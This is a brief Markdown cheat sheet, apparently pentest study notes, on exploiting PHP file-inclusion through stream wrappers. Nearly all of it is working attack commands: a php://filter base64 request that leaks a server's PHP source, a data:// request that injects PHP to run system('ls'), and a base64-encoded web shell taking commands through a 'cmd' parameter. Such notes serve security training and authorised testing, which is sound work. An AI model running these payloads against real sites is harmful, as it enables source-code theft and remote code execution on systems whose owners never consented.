---
tags:
  - Exploitation
  - Foundational
  - Initial_Access
  - Web_Application
---

### PHP Wrappers

#### Read PHP Source with Base64
> [!tip] Encodes output to prevent execution, reveals source code.

```bash
curl http://<Target>/index.php?page=php://filter/convert.base64-encode/resource=<File>.php
```

#### Decode Base64
```bash
echo "<Base64String>" | base64 -d
```

#### Execute Code with data:// Wrapper
> [!warning] Requires **allow_url_include=On** in PHP config.

```bash
curl "http://<Target>/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

#### Base64 Encoded data:// Wrapper
```bash
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```

```bash
curl "http://<Target>/index.php?page=data://text/plain;base64,<Base64Payload>&cmd=ls"
```
